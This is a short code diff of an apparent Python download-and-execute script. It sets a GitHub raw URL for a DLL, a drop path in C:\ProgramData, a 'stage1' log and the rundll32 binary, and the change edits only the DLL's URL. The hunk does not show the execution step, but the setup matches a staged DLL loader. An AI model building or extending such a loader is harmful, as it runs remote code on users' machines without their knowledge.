@@ -3,7 +3,7 @@ import subprocess
 import urllib.request
 
 # CONFIGURATION - Raw strings 'r' fix the \r and \W escape errors
-dll_url = "https://raw.githubusercontent.com/adstudy182-debug/Demo_Work/main/V1/TEST_Dll1.dll"
+dll_url   = "https://raw.githubusercontent.com/adstudy182-debug/Demo_Work/main/dll/TEST_Dll1.dll"
 dll_path = r"C:\ProgramData\TEST_Dll1.dll"
 log_path = r"C:\ProgramData\stage1.log"
 rundll_bin = r"C:\Windows\System32\rundll32.exe"
